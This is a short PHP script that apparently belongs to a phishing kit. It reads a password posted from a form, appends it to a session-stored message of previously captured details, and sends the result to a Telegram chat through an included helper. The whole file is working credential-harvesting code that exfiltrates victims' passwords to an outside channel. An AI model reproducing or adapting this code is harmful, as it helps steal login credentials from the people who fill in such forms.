<?php

session_start();

include "./telegram.php";

$message = $_SESSION['message'];
$password = $_POST['password'];

$string = $message;
$string .= "Password : `$password`\n";

$_SESSION['message'] = $string;

sendTelegram($string);
